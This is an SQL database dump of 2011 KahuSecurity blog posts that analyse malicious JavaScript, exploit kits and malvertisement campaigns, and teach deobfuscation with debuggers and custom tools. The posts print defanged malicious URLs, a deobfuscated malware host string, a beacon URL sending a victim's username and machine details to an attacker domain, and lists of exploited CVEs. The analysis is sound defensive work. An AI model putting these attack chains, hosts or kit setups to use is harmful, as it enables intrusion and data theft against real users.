tools that work well enough in certain cases to help you with your analysis.\nOne other thing to consider is that some very tough obfuscated scripts can be cracked by many of these tools when in the hands of a skilled analyst. You might need to spend a lot of time with the tool to get the results you want.\nPost Script\nA few thoughts about this experiment…\nIt seems that multi-layer evals and DOM-based scripts are not easy to deobfuscate. Chrome and Firebug were the only tools that properly deobfuscated all three samples. The other Firefox plug-in, Javascript Deobfuscator, and the Microsoft debuggers were all tied at a close second.\nA few of these tools require some knowledge of the script. You can’t blindly sprinkle breakpoints everywhere and hope for the best. In some cases, you will need to look for the deobfuscated code in the tool’s interface so your knowledge of the script will help you find the variables.\nMost of these tools work only with a specific browser. If the script detects the browser or uses a non-standard function then your results will vary.\nDebuggers, Firefox plug-ins, etc will execute potentially malicious scripts on your PC so be careful! You might want to think about disabling your network connection to prevent unwanted redirection and use a VM without Java, Flash, and Acrobat installed.\nFinally, be on the look out for anti-debugging code such as the following example. This script will not give you a response if you step through the code. Of course they won’t be written this plainly and there’s dozens of different possibilities and methods.\nvar a = new Date().getTime();\nvar b = \"%68%65%6C%6C%6F\";\nvar c = new Date().getTime();\nif(a==c) {\nalert(unescape(b));\n}', 'javascript, obfuscation', 'http://www.kahusecurity.com/?p=1643\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (137, 'Javascript Deobfuscation Tools (Part 1)', 'darryl', 'June 17, 2011', 'Deobfuscating Javascript can be tricky so why not make the job easier by using a tool? There’s several tools that can help you deobfuscate Javascript. Before I get to those tools, I wanted to show you how to deobfuscate them manually. I’ve been getting a lot of requests from folks who want to learn how to deobfuscate malscripts so this article is for you.\nLet’s have a look at the malicious scripts. These scripts were found in the wild and randomly selected based on its difficulty. I’ve uploaded these scripts to Pastebin.com so you can play along (warning, these are real malicious scripts so take the necessary precautions!).\nSample 1\n\nThis script is simple and should be easy for the tools to handle. There are interweaving comments that do nothing but throw you off visually. The script concatenates a long string of hex characters which are converted to text and reversed. Each text character is then searched for in a string and a corresponding new character is referenced. \nHere’s the string that the characters are searched for and the second line is the converted value:\nSP%cpH2W5C83fEX:1rjF9AQdMlKi/sk4GuvtxJOBm_U.NqzY7aw&nhgZoVT=0IbRDye?6-L\n0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ/.:_-?&=%\n\nFor example, if the first value is “L”, it will be converted to “%”. These new characters are joined together to form another string of hex characters which are finally unescaped to form the final script.\nHere’s what you can do to see the final script:\n\nAnd this is what you get:\n\nSince this article is about tools, here’s a program that I wrote. It’s called Revelo (which is Latin for “reveal”) but it’s not quite ready for public release. This tool automates some of the manual changes I make to the scripts to deobfuscate the code. It’s not a debugger and more like a set of tools.\nRevelo has a built-in packet sniffer and proxy so I can capture the resulting HTTP request and see the URLs without actually visiting the site. It also has a built-in firewall to protect my PC from accidental redirects.\n\nBesides that, it can also reveal the actual deobfuscated code. I select the “Enclose Javascript in TextArea” option and get the resulting code:\n\nSample 2\n\nThis script is also simple. What makes it look difficult is the use of fake variables everywhere. The hex code you see is actually the redirection URL and the code attaches a new script to the body using DOM. The use of DOM can trip up Javascript tools which makes this one a little more difficult.\nTo get to the deobfuscated code, we actually have to read through the script and learn about the variables being used. I cleaned up the script using Revelo’s built-in Javascript beautifier. Now we can see that variable “__” holds the URL and variable “B” holds the object that attaches to the body. Here’s what we do with the script:\n\nAnd this is the result:\n\nUsing Revelo, I can view key elements or walk the DOM tree and get the results:\n\nHere, I select the “Intercept DOM with Variable” option and enter the “B” variable. This is basically the same thing we did manually above.\n\nSample 3\n\nThis one is a heavily obfuscated script. This script makes two passes and evals the result each time. Some tools may just deobfuscate the first eval and fail to deobfuscate the second.\nThe top part has a lot of gibberish defined as variable “uXGJZXGp”. This part needs to be deobfuscated last. Half-way down are decimal values that are separated by pipe characters. The Javascript at the bottom processes this part first which simply converts the decimal value to text after performing a bitwise XOR using the value of 195. The resulting script is then eval’d which then converts the gibberish at the top into exploit code.\nThe script needs to be deobfuscated in two parts. I’ll use the Revelo tool because it’s basically the same as doing it manually, it’s just easier to see.\nTo deobfuscate the first part, you can alert on the variable “hTN1NQic” at the very end (e.g. “alert(hTN1NQic);” ). Revelo does the same thing but gives me a little more flexibility. I choose “Intercept Function with Name” then enter “PlrBMHYO.eval”. Revelo converts the function name to “document.write” (e.g. “document.write(hTN1NQic);” ).\n\nWe now have the first part deobfuscated. I have to copy this part over to the original script and get rid of the script at the bottom as well as the decimal section (essentially you need to keep the gibberish stored in variable “uXGJZXGp”). Here’s what it should look like:\n\nThis new script selects certain characters from variable “uXGJZXGp” and switches them around in a seemingly random pattern. Here’s the first 63 characters of the gibberish:\n\ntp \"ht ost :/ .cc\"c=h.acke/z;10dezccp 05y 4fc257\"fcf=dfa6940...\nThe first and fifth character swap positions, second and sixth swap positions, etc. Then it starts over swapping every three characters. It loops again and does it with two characters. And so on. This is how the string will change after each loop (total of nine):\n123456789012345678901234567890123456789012345678901234567890123\ntp \"ht ost :/ .cc\"c=h.acke/z;10dezccp 05y 4fc257\"fcf=dfa6940\n\"ht tp :/ ost \"c=h .cce/z;.ackzccp10de 4fc 05yfcf=257\"dfa6940\nt\"ht:/ p \"cost.cc=h ;.ae/zccpckze 410d05yfc =25fcffa67\"d940\nt\" :/ht pco \".csth c=ae;.cc/zkzpc41e 050dc yf5f=2facf\"d67940\n:/t\" pht \".cco c=sth.ccae;zpc/zk 0541e yf0dc2fa5f=d67cf\"940\n: t/ \" hp t.\"cc oc s=htc.ac;epz/ckz0 45e1y 0fcdf25a=f6dc7\"f490\nt/: \" thpcc.\"c ohts=acc.pz;ekz/c450 y e1cd0f5af26d=f\"fc7490\n\" thpt/: ohts=cc.\"c ;ekz/cacc.pze1cd0f450 y =f\"fc75af26d490\nohts= \" thpt/:z/cacc.pzcc.\"c ;ek y =f\"fc7e1cd0f4505af26d490\nhost = \"http://zacccp.cz.cc\"; key = \"fcfe7c10d4f05a52fd6940\nAt the very bottom of the script, you can see the reference to this variable. I use the same “Intercept Function with Name” option which is similar to alerting on the variable (e.g. “alert(uXGJZXGp);” ).\n\nAnd there you have it, the deobfuscated script!\nIn Part 2, I’ll try to deobfuscate the above scripts using a bunch of various Javascript tools.', 'javascript, obfuscation', 'http://www.kahusecurity.com/?p=1486\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (138, 'Best Pack', 'darryl', 'June 15, 2011', 'ScriptKiddieSec broke the news about a new exploit pack called “Best Pack”. Rumor has it that this is the successor of Dragon Pack. I still can’t find the original Dragon Pack so if there’s anyone willing to share, please send it to me!\nAnyway, I was lucky to find this in the wild. Here is the obfuscated Javascript exploit code:\n\nYou can see at the top of the page that it calls two external JS files. The “pda.js” detects browser plug-ins. The “foo.js” file uses object oriented programming to execute the malicious code.\n\nThere may be others but this is the first pack I found in the wild that uses OOP in Javascript.\nThe Javascript at the bottom of the main page pulls in content from the various DIV containers, pieces them together, and converts them into hex. At the very end, the long string of hex characters are unescaped then eval’d.\n\nOne line of the code was particularly interesting which I never saw used before (note the use of the plus-sign at the beginning):\n+wGuftEnZ.showName;\nIf I remove the plus-sign, the script doesn’t work! After doing some research, I found this article which describes this new calling method instead of doing it the regular way like so:\nwindow.parseFloat(wGuftEnZ.showName.valueOf());\nor just this:\nwGuftEnZ.showName();\nIn this article, there was a sample script and many of its components were found in this exploit pack’s code.\nAnyway back to the exploit script…\nAfter you decrypt the script, you will end up with this:\n\nThere were nine major functions that would execute the various exploits. These functions are called up in reverse. From what I could make out, these are the exploits being used:\n* CVE-2011-0611 (Flash 10)\n* CVE-2010-0188 (LibTiff)\n* CVE-2010-0842 (Java Midi)\n* CVE-2010-0840 (Java Trust)\n* CVE-2010-0886 (Java SMB)\n* CVE-2010-3552 (Java Skylined\n* CVE-2008-2463 (IE Snapshot\n* CVE-2006-0003 (IE MDAC)\nHere’s a screenshot of the panel (thanks again ScriptKiddieSec):\n\nThis exploit pack appears to be offered as a rental service for $25 per day.', 'bestpack, dragon pack, exploit kit', 'http://www.kahusecurity.com/?p=1431\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (139, 'Sava Exploits Pack', 'darryl', 'June 14, 2011', 'This is a new exploit pack that is being offered for free. It also goes by the name, “Pay0C Pack”. The author seemed to have combined exploits and content from various other exploit packs.\nHere’s a list of the exploits said to be included:\n* Sun Java Calendar Deserialization Exploit\n* Sun Java JRE\n* Java RMIConnectionImpl Deserialization Privilege Escalation Exploit\n* Sun Java JRE AWT SetDiff ICM Buffer Overflow\n* Signed Applet Social Engineering Code Exec\n* Java Statement.Invoke Trusted Method Chain Exploit\n* Adobe Collab.getIcon\n* Adobe Doc.Media.newPlayer\n* Adobe Util.Printf\n* PDF Exploit LibTIFF\n* Bleeding Pack PDF\n* AOL Instant Messenger\n* Firefox Escape retval + any FF\n* Internet Explorer COM CreateObject\n* Windows ANI LoadAniIcon\n* Snapshot Viewer for Microsoft Access\n* Internet Explorer Tabular Data Control ActiveX\n* Internet Explorer Winhlp32.exe MsgBox Code Execution\n* Microsoft Help Center XSS and Command Execution\n* Internet Explorer CSS SetUserClip\n* America Online ICQ ActiveX\n* IE_0Day\n* IEPeers\n* SpreadSheet\n* ShockWave\n* CVE_2010_0806\n* Aurora\n* IE CreateObject\nHere’s a look at the web panel:\n\nIf the panel looks familar to you, it should, it’s Eleonore:\n\nThe Javascript exploit code is pretty hefty, here’s what it looks like:\n\nAfter beautifying the Javascript code, we have a better understanding of what it’s doing:\n\nAs you can see, it uses a bit of math and bit-shifting to convert the random-looking text at the bottom. And it processes this data in 1K chunks. The deobfuscated script is very long. Here’s a portion of it:\n\nThe author indicates that there is an improved version which has more features built into the panel. I have no further information as far as the additional features and cost are concerned. Have a look at this pack which is similarly named “Savage Exploit Pack”:\n\nBy the way, this panel has been reused from another exploit pack called “Tornado”.', 'exploit kit, pay0c, sava, savage', 'http://www.kahusecurity.com/?p=1417\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (140, 'Deobfuscate Javascript Using MS Tools', 'darryl', 'June 13, 2011', 'Several readers sent me email asking how to decipher Javascript code without doing it manually. There are actually several tools out there that can help you. Malzilla, SpiderMonkey, and Rhino seem to be the most popular. But I found that there are some tools from Microsoft that can get at the deobfuscated code without breaking a sweat!\nLet’s have a look at a couple of little-known tools that you can use to decrypt Javascript: Microsoft Script Debugger, Microsoft Script Editor, and Microsoft Internet Explorer 8. The Script Debugger is a minimal, stand-alone application that offers traditional debugging features. The Script Editor is far more robust but is bundled with Microsoft Office 2000 through Office 2003. Finally, IE8 has a JS debugger built in that’s accessible from Developer Tools.\nBefore you get started, do keep in mind that when using a debugger, you *will* be executing potentially harmful malicious code so take the necessary precautions!\nScript Debugger\nMicrosoft Script Debugger is free and can be obtained here . To activate the debugger, you first need to enable script debugging in Internet Explorer by making sure both of the “script debugging” options are unchecked.\n\nHere we have an actual malicious script.\n\nLaunch IE and ensure you set the “Break at Next Statement” from the “Script Debugger” menu item before running the script.\n\nScript Debugger will then launch and you should see something like this.\n\nStep through the code until you get to the very end but don’t let it get past this point yet. While you are here, you can enter the value “hTNiNQic” in the “Command Window” and you can see what’s being stored.\n\nWhen you step through (by clicking on Debug > Step Into), another window will appear. This are the results of the eval in the code which is the second layer of obfuscated code.\n\nAgain, have it go through to the very end but stop it before the last step. This time enter “uXGJZXGp” and you’ll see what’s there.\n\nStep through once again and the final eval will be deobfuscated.\n\nYou can now copy the code from this third window since this is the final deobfuscated code.\n\nSimple right?!\nScript Editor\nLet’s now have a look at Microsoft Script Editor. You need Microsoft Office 2003 (or 2000) but you don’t have to install the entire suite. Choose the custom install and disable everything except for the following:\n\nWe’ll use the same malicious script and activate Script Editor the same way as described above. You should see the following when the program loads.\n\nJust go to the very end of the script and just before the last statement, place your cursor in front, right-click and select “Run to Cursor”.\n\nAt this point, the Script Editor will stop just before performing the eval. In the “Immediate” window, you can enter variables to see what is being stored in there.\n\nStep through the eval and Script Editor opens another instance.\n\nOnce again, go to the very end, place your cursor in front of the last statement, and run to the cursor once again.\n\nA third instance should open and you should now see the final rendered deobfuscated code.\n\nIE8 Developer Tools\nA third tool that you can use to analyze malicious Javascript is built right into Microsoft Internet Explorer 8, specifically, the script debugger in the Developer Tools feature. Launch IE8 and then go to Tools > Developer Tools before opening the script. A new window will open and you can begin debugging.\n\nGo the end of the script and just before the last step, insert a breakpoint by right-clicking and selecting the option from the context menu.\n\nWhen you run through the code, the debugger will stop before proceeding. What’s cool about this tool is that all the local variables are enumerated and populated as the code runs. Go ahead and click on the “Locals” tab and see the values stored in all the variables.\n\nWhen you step through, another set of undefined variables will show up in the “Locals” tab.\n\nAdd another breakpoint before the last step.\n\nFinally, the script is deobfuscated!\n\nThis is probably the best tool out of the three.\nCaveats\nThere are a few things to consider before using any one of these tools. First and foremost, you will be executing potentially malicious code so protect your PC by using the tools in a VM.\nSecondly, these tools only work with IE. Some scripts could be written to have a different behavior if running in Firefox or Chrome. Most of the time, IE is the preferred platform but keep this in mind anyway.\nNot all scripts will be deobfuscated this easily. You may have to figure things out along the way such as where to insert breakpoints, clearing cookies, stitching sections together, etc.\nAside from the disadvantages, it can be useful to use a debugger. Take, for example, this code (I deliberately used conditional compilation so this would look tricky). If you were to *quickly* run through this in your head, what would you think the alert box say?\n/*@cc_on\n@set @var=1-1;\n/*@if (@var==0)\nalert(\"one\");\n@elif (@var)\nalert(\"two\");\n@else @*/\nalert(\"three\");\n/*@end\n@*/\nIf you said “one”, you would be wrong. It would pop up with “two”. It’s an easy mistake to make if you looked at this very quickly or was too tired, etc. A debugger might help in tricky situations like this. Incidentally, if you run this code using Firefox, a “three” would popup so be sure to remember point two above.\nI’m in the process of trying out various tools to see how they fare against live malicious Javascript code. I’ll post the article as soon as possible as I’ve had a lot of requests from folks on this subject.', 'debugger, deobfuscation, developer tools, ie8, javascript, microsoft, script debugger, script editor', 'http://www.kahusecurity.com/?p=1353\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (141, 'Black Hole Malvertisement Campaign', 'darryl', 'June 11, 2011', 'There’s yet another malvertisement that leads to Black Hole. This campaign is affecting a fairly popular site.\n\nThe malicious script is linked from many of the site’s pages. Here’s a shot of the webpage’s source code which shows the initial link.\n\nThis is the sequence of events:\n1. hxxp://www.investopedia.com/\n2. hxxp://www.investopedia.com/common/oas.aspx?pos=x70,x80,x01,x30,x10,x91,x04\n3. hxxp://ops.investopedia.com/RealMedia/ads/adstream_mjx.ads/investopedia.com/pf/[email protected],x80,x01,x30,x10,x91,x04?IPCT_Credit=IP_contentTag&IPCT_Credit_Report=IP_contentTag&IPCT_Laws=IP_contentTag&IPCT_Regulations=IP_contentTag&IPST_Dictionary=IP_sectionTag\n4. hxxp://farelfusion.com/adserver/display.cfm/731/1534/45613/j/cd/?pbnt=515a4dg&\nregt=481643&imprx=16127627&mprtdp=\n5. hxxp://bazagg.cz.cc/index.php?tp=f72e3460ec918248\nHere’s the obfuscated Javascript code with some added misdirection in the form of comments:\n\nThe script concatenates a load of hex values and converts them to text. It then reverses the text and builds a lookup table (e.g. character substitution table). Each character in the text is converted to another character in which you end up with hex values. The hex is finally converted to text and executed. The script is easy to figure out so I simply replaced eval with alert and got the following:\n\nThe malicious script calls a counter page, creates an iframe to the exploit kit, calls up the counter page again, then shows an ad graphic. Here’s the website with the ad in place:\n\nThe obfuscated script appears to be modified every day so as to avoid detection. The malicious domain was not responding at the time of the write up so I don’t know what it is delivering.', 'blackhole, javascript, malicious, malvertisement, obfuscation', 'http://www.kahusecurity.com/?p=1325\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (142, 'Reversing the Incognito Exploit Kit', 'darryl', 'June 4, 2011', 'Looks like Incognito got updated yet again. Let’s reverse the Javascript exploit code…\n\nFirst let’s clean this up (the complete script is here)! You can see it’s now using p, div, and span tags to hold the obfuscated code which is different than the earlier versions. \n\nWhile the Javascript code at the bottom looks different than the previous version, there are several similiarities.\n\nWhat the Javascript does first is build out the list of key Javascript objects:\n“indexOfunescapeevallengthcharAtinnerHTMLgetElementsByTagNamedivgetElementById”\nOther functions in the script uses “substr” to extract the text (i.e. the Javascript object) it needs to perform its tasks.\nAt the very top of the script, there are three DIVs. The first one decrypts to the string above. The second and third are used as lookup tables if you will and called upon by the “LywIs” function which decrypts the junk at the top.\nWhat that function does is read in the gibberish, after it has been concatenated into one long string, one character at a time (e.g. “hMTTuHhMTTuFhMTTuUhMTTydhMTTuthMTTudhMTTuQ”). The first character is “h”. Go ahead and find it in the first string of characters below and remember its position. \nqgxuMoLXtBywHhFDzTNdYPUQclvJpbKIikAnOZfSWaERrmVsjCeG\nAaE6ub2Bd87F4%f9D0c51C3e\nNow look at the shorter string above and get the character at the same position. That’s the converted value. In this case, it’s the “%” character. The top string is twice as long as the second but only the first half is used.\nThe next character is “M” which corresponds to “u”. The third is “T” which is “0”. And so on…until you get this.\n\nTo shortcut this, you can modify the function this way:\n\nNow, you just need to convert this from UCS2 to Hex then convert Hex to Text. You should then get this:\n\nUnlike some of the other exploit kits, Incognito 2.0 only uses a limited number of exploits:\n$exp_list = array(“jark”,”rox”,”hcp”,”jdt”,”libtiff”,”mdac”);\nEach of these exploits are spread over four steps in the code we just deobfuscated. Let’s look at the last step, “step3”. This function pushes out one of two PDF exploit files depending on your browser/version.\n\nThis PDF file I downloaded contains Javascript code that deobfuscates the junk at the bottom. This is rather simple to figure out. In fact, this technique looks similar to what the Black Hole exploit kit uses.\n\nUp near the top of the Javascript are two variables which look like years:\nCekipyboRijehyxo=2011;\nvar j = CekipyboRijehyxo-2007;\nThe result is 4. Remember that for later. After a bunch of concatenation, text replacements, and other steps to try and throw you off, the Javascript code takes the junk at the bottom and decrypts it. Here’s an excerpt of the gibberish:\nj*29.5,j*24.25,j*28.5,j*8,j*24.5,j*26.5,j*28.75,j*25.75,j*15.25,j*9.75,j*9.25,j*29.25,j*14.25,j*12…\nIf you remember, the value of the variable “j” is 4. 4 x 29.5 = 118. 4 x 24.25 = 97. Keep going till you are done then convert the decimal values to text. You will end up with this:\n\nIf you look at the Metasploit PDF exploit module, you will see that this is very familiar. There’s shellcode up at the top, now let’s analyze that. You will first need to convert this to binary. There’s a number of tools to help you do that. I like “Malzilla” by Bobby. Paste the shellcode into the “Misc Decoders” tab:\n\nClick on the “UCS2 to Hex” button then the “Hex to File” button and save the file. You will end up with this:\n\nAnother favorite tool I like to use is “sclog” from David Zimmer which dumps and hopefully decodes the shellcode. Just enter the following command:\n\nAnd you will get the decoded result. If this doesn’t work for you then you can use another one of David Zimmer’s tools called “Shellcode2EXE” then analyze the EXE file.\n\nWhen I visit this URL, I get an executable file called “setup.exe”. Uploading this to VirusTotal and we get the following results. It looks to be a packed downloader with 12 of 43 (27.9%) coverage. \n\nHere’s the link: http://www.virustotal.com/file-scan/report.html?id=fcd8e5146b67bcc3de663cd29dd805af5dea50e6dcad60c3328fefbdae0e2c8f-1306709857#\nSince it’s likely to be a downloader, I fire up my packet sniffer and run the program. This program downloads a file also called “setup.exe”.\n\nThe downloaded file ends up in c:\\windows\\temp\\ and is renamed to “_ex-68.exe”. I shoot that over to VirusTotal and it is only picked up by 7 of 42 AV engines (16.7%).\n\nHere’s the link: http://www.virustotal.com/file-scan/report.html?id=066e29c43bf818e1cb35efe8bc408fe5ac65632814198382b3f7c7c1aecad5ce-1306726815\nWhat is this last executable? You guessed it…rogueware.\n\nHopefully this helps you better understand how to reverse Javascript and tackle some of the binaries you get during your analysis.', 'deobfuscation, incognito, javascript, malzilla, pdf, sclog, shellcode', 'http://www.kahusecurity.com/?p=1254\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (143, 'Wild Wild West – 06/2011', 'sectek', 'June 1, 2011', 'lots of requests to keep this going ….send me updates here: sectek at live dot com', '', 'http://www.kahusecurity.com/?p=1206\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (144, 'Hidden Malicious Redirector', 'darryl', 'May 28, 2011', 'Normally when you visit a webpage that’s been compromised, you can find the malicious redirect link (e.g. iframe, Javascript) by viewing the HTML source code. On this particular website, the malicious redirect link only appears when the webpage is saved or if you use Firebug.\nLet’s take a closer look. Here’s the website:\n\nThis is the source code. Pay close attention to the scripts between the “Website Tagging” comments. Nothing malicious there right?\n\nBut when you save the webpage, the malicious redirect link appears.\n\nHere’s Firebug in action. You can see it there on the far right.\n\nThere must be some Javascript code embedded in the PHP page that’s injecting the iFrame (probably doing an appendChild function). Alright, now let’s have a look at the exploit code.\n\nHere’s the beautified version. As you can see it’s nothing fancy. Looks like they’re using a character lookup table.\n\nAfter you decrypt the script, you get one more obfuscated script. This one is using a compression algorithm that’s similar to Dean Edward’s Packer.\n\nJust change the “eval” up at the top to “alert” and you get the final script.\n\nThis is definitely an exploit script targeting Java and Acrobat. The foofranc.co.cc site is distributing the malicious JAR and PDF files inconsistently. When it does succeed, one of the payload files is a downloader. It also collects data from your PC (username, machine name, GUID) and sends it to another site:\nhxxp://foochin.co.cc/l/da873f2b2c0979a9377d578e4cc9c378c0acce01a1026af601a9e6052900beab/?ver=3&label=24-may-2011-mini&user=Administrator&comp=MyPCName&guid=f8248acd-a91d-4123-a3ff-1c5d2ad7d975&id=8ce8232a63b7ddaac543abe12314ea68fc9af1255e7cb1fc0be8a19be7ab80a\nAnother is rogueware and your PC will also have some functionality disabled as part of the installation.\nThe third file is a Google search redirector. It will modify the proxy setting on your computer and route traffic to 127.0.0.1:58323 where this program is listening. When certain Google searches are made, the program will redirect the clicked links to one of their sites. Using Firefox and Chrome, depending on its configuration, will also have its Google search results redirected too.\nHere’s a quick search for “italian food”:\n\nI clicked on the “Olive Garden” link but got to this site instead:\n\nThere’s also two other programs that gets dropped: csrss.exe and dwm.exe . These appear to be variants of the Google search redirector program.\nDownloader/Data Collector (6 of 42):\nhttp://www.virustotal.com/file-scan/report.html?id=b9fc687d577521f847f70d7ded1f6cb3aa4b8f0f7a70b665fced24a172d11700-1306604397\nRogueware (11 of 42):\nhttp://www.virustotal.com/file-scan/report.html?id=b83d8ff744373038d2970bd5a4e7e1297a149916e2dbf881c88b18038e67a87c-1306604273\nGoogle Search Redirector (6 of 42):\nhttp://www.virustotal.com/file-scan/report.html?id=19ac822ce0e4b37ebc74c5705cc657ec31984b8a0c3a4d8085e412607d5c5c04-1306571823\ncsrss.exe (5 of 42):\nhttp://www.virustotal.com/file-scan/report.html?id=b7c30f1707906d28198bf62a3979f395336f2cbb1e364b3a175b93d5a348bbe2-1306608454\ndwm.exe (4 of 42):\nhttp://www.virustotal.com/file-scan/report.html?id=34c20441637483c0f3d9e2981ed4e2f8240d7c0db4758ac57030b9b7a9119afe-1306607976\nAfter the installation was done, the cache contained a few files left over after the malware installation. Two of them were notes left by the hacker:\n\nI need to thank “V”, another member of KahuSecurity who posts articles here on RARE occasions (hint, hint), for doing some of the research on this case.', 'javacript, malware, obfuscation, rogueware, search redirector', 'http://www.kahusecurity.com/?p=1147\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (145, 'Meta(sploit) Pack', 'darryl', 'May 20, 2011', 'Some time ago, the Open Source Exploit Pack was released on some hacker forums. As the name implies, the author has intended for this to be open source and improved by others. Well, someone recently modified this pack and got it to work with the Metasploit Framework as the back-end. It’s called MetaPack.\nBefore I get to that, let’s take a quick look at the Open Source Exploit Pack first.\nThis pack comes with the following exploits:\n* CVE-2006-0003\n* CVE-2007-5659\n* CVE-2008-2463\n* CVE-2009-0927\n* CVE-2009-1136\n* CVE-2010-0188\n* CVE-2010-0249\n* CVE-2010-0806\n* CVE-2010-0886\n* CVE-2010-3653\n* CVE-2010-3962\n* OSVDB-61964\nHere’s what the obfuscated exploit code looks like. I found this in the wild a couple of weeks ago:\n\nThis is the beautified version of the script that deobfuscates and executes the exploit. It uses a character shifting method to obfuscate the code.\n\nAt the bottom of the source code, there’s a meta refresh tag:\n<META HTTP-EQUIV=”REFRESH” CONTENT=”1;URL=index.php?Number=2″>\nThis takes the user to the second page of exploits if none of the exploits on the first page worked. This process repeats itself until the fourth page and then it stops. If an exploit does work then the payload is delivered and the redirection stops.\nEach page contains the same obfuscated Javascript code but the variables and gibberish text are different. One way to deobfuscate the code is to change the third to the last line (see the screenshot above) from “zXx3W7y4I.write(rYYVMWR3L);” to “alert(rYYVMWR3L);”.\nHere are the deobfuscated exploit code for each of the four pages:\n\n\n\n\nSince I didn’t have access to the panel, there’s no way to tell just how effective this kit is. By the way, here’s what the statistics panel looks like without any traffic:\n\nNow let’s get back to MetaPack which is also known as GuerillaPack or ChePack.\nIt is an interesting concept to combine an exploit pack with Metasploit. The exploit pack’s admin panel provides the load statistics and the ability to easily swap out the payload file while Metasploit has a lot of exploits to choose from. I suppose this pack was made for those who don’t know how to convert or export exploits from Metasploit.\nTo set up this pack, you need to start Metasploit and load it up with the exploits you want to use. Or you could write a script to dynamically call up the appropriate exploit automatically.\n\nWhen you configure each exploit in Metasploit, the “download and exec” payload you choose is the URL for the exploit pack. The exploit pack’s config file contains the exploits you want to use so it can keep track of them.\nCool, it works.\n\nThis pack is definitely an interesting concept but I don’t think we’ll be seeing a lot of this in the wild. For one, the Metasploit Framework is one hefty install. I suppose you could minimize the MSF install to run with the bare essentials or install the main parts on a Heroku-type server. The other thing is that the Metasploit exploits are detected by AV so you would need to wrap the exploits with some kind of obfuscation.', 'chepack, exploit kit, guerillapack, javascript, metapack, metasploit, obfuscation, open source explo', 'http://www.kahusecurity.com/?p=985\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (146, 'Flash Used in Idol Malvertisement', 'darryl', 'May 13, 2011', 'As the American Idol finale approaches, millions of people are keeping an eye on the results. So what better time to launch a new malvertisement campaign! This one can be found on a popular idol fan page.\n\nIf you visit the site directly, everything acts normally. It’s when you arrive on the site via a search engine does it turn ugly on you.\n\nHere we see that one of the files checks where you came from. It also looks at your browser and cookies.\n\nTrying to find the actual source of the rogueware link can be a bit of a challenge. I looked at every relevant file but couldn’t find it. Here’s the chain of events I had so far:\nhxxp://americanidolnet.com/\nhxxp://partner.googleadservices.com/gampad/google_service.js\nhxxp://pubads.g.doubleclick.net/gampad/ads?correlator=1305321989351…\n*** missing link ***\nhxxp://adserver-cdn2.com/ts/go.php?sid=1006\nhxxp://adserver-cdn2.com/ts/geoipcity/cred_aidol.php\nhxxp://adserver-cdn2.com/aidolstatsgn3.js\nhxxp://singul.co.cc:81/bl1/\nhxxp://singul.co.cc:81/bl1/include/PluginDetect.js\nhxxp://singul.co.cc:81/bl1/add_visitor.php?referrer=http://americanidolnet.com/\nhxxp://www3.save-holderjmk.cx.cc/?edd5a62=m%2Bzgl2ullKmWU9jY0K…\nhxxp://www1.addprotectionte.vv.cc/28zguc6f?57opfyp…\nhxxp://www1.addprotectionte.vv.cc/24512f4.js\nThe last thing to check was a Flash file at:\nhxxp://adserver-cdn2.com/grepolis_aidol_160x600.swf\nI decompiled it and what do you know…\n\nLooking back at the website about a fifth of the way down, the vertical Flash ad for “Grepolis” is the missing link.\n\nOne thing that caught my eye was the “bl” directory name on the co.cc server. Bleeding Life exploit kit? Sure looks like it…', 'american idol, bleeding life, flash, malvertisement', 'http://www.kahusecurity.com/?p=545\n');
INSERT INTO `KahuSecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (147, 'Deobfuscating the Facebook Spam Script', 'darryl', 'May 12, 2011', 'The latest Facebook spam Javascript code was sent to me. Apparently there are two versions, one was obfuscated while the other wasn’t. Lucky me, I get the obfuscated one!\n\nMy first thought was “wow, nice obfuscation but should be easy to get around”. Ha, no such luck. The second layer is worst than the first. Do you see the fifth line from the top on the right-hand side? It’s callee!\n\nThe “callee” technique is a kind of booby trap for Javascript reversers. You can read about the technique from various SANS diaries and others. The callee function reads in the calling function and in this case, the code strips away the special characters, counts the length, and then uses the value for decryption. If you add or delete any character in the function (e.g. changing “eval” to “alert”, the length changes and the decryption fails. This is a basic form of anti-reversing.\nThere are a couple of techniques to get around this. SANS and others provide the various techniques. One of the easiest to deploy is to add a new function outside of the original one (seen here in the red box).\n\nDown at the bottom of the script is an “eval” function. We change that to “evla”. By doing this, we don’t change the length.\n\nSo when the code is executed, the value of n$ gets sent up to the new function we created where we get to see what’s there. Which is….another layer of obfuscated code!\n\nSince there’s no callee function here, we can beautify it. Here we see variables getting loaded up after some tricky conditional statements.\n\nAfter three layers of heavy obfuscation, we are finally treated with an excerpt of the script that’s causing all the spam.\n\nYou can see the complete source of the script here:\nhttp://pastebin.com/nkBx8GbH', 'deobfuscation, facebook, javascript, obfuscation, spam', 'http://www.kahusecurity.com/?p=458\n');
